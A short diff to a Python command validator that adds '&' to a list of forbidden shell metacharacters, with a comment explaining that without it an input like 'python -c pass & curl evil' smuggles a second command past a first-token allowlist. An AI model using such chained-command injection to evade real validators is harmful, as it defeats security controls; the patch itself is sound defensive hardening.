@@ -96,6 +96,9 @@ _DEFAULT_DENY_SUBSTRINGS: tuple[str, ...] = (
 
 _FORBIDDEN_METACHARS: tuple[str, ...] = (
     ";",
+    "&",        # cmd.exe unconditional separator *and* POSIX background; also
+                #   covers "&&" below. Without it, `python -c pass & curl evil`
+                #   smuggles a second command past the first-token allowlist.
     "&&",
     "||",
     "|",
